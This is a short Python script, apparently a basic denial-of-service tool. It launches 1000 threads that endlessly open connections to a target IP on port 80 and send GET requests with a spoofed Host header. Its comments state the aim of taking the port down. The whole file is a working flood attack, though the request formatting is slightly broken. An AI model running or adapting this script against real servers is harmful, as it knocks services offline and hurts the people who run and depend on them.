import threading
import socket

already_running = 0

target = '192.168.56.1' # IP address of the target
port = 80 # Port that we want to take down, in this case it's http
fake_ip = '172.15.203.85' # IP address that will be in the header, still not anonymous

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a socket
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port)) # Send a GET request
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

for i in range(1000): # Create 1000 threads
    thread = threading.Thread(target=attack)
    thread.start()